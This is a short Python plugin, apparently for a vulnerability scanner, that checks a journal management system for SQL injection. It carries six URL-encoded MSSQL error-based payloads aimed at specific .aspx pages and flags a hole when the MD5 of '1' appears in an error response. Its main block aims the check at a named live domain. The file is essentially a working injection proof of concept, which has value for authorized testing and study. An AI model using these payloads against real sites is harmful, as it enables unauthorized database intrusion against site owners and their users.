#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:菲斯特诺期刊系统5枚注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0125186，http://www.wooyun.org/bugs/wooyun-2010-0116361


def assign(service,arg):
    if service=="newedos":
        return True,arg 
    


def  audit(arg):
    ps=[
        "showunit.aspx?classid=1&newsid=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "CompanyList.aspx?parentid=1/**/and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/&&classid=1",
        "supplyproduct.aspx?cid=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "viewmulu.aspx?qi_id=0&preqi_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))&mid=23292&xuhao=56 ",
        "ExhibitionCenter.aspx?area=-1'%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "select_jianli.aspx?type=workto&content=1%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))/**/and/**/%27%%27=%27"
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        
        if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole('SQL injection:'+url)  


if __name__=="__main__":
    from dummy import *
    audit(assign('newedos','http://www.scdwzz.com/')[1])